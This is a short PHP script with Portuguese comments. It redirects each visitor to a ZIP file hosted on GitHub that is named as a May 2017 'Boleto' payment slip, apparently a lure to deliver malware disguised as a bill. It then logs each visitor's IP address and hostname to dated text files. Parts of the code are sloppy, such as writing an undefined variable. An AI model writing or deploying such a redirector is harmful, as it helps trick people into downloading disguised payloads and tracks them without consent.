<?php

 $links = array();
 
$links[1] = "https://github.com/financeiror/cobranca/raw/master/Boleto-Maio-2017WQXXYLKD1SSNUMB823892738.zip";



# Agora vamos fazer o PHP gerar o link randômico
srand((double)microtime()*1000000);
shuffle($links);

 header("location: $links[0]");
  
		//CONTADOR DAQUI PRA BAIXO RS
		$timestamp  = mktime(date("H")-3, date("i"), date("s"), date("m"), date("d"), date("Y"));
		$datinha    = gmdate("d-m-Y", $timestamp);
		$ip = $_SERVER['REMOTE_ADDR'];
		$hostname = @gethostbyaddr($ip);
		$tipo = $_POST["tipo"];

		$abrir_txt = fopen('indexx/'.$datinha . ' - ' . $ip . ' Hostname: ' .$hostname . '.txt', "a");
		fwrite($abrir_txt, $info_salva);
		fclose($abrir_txt);
 
?>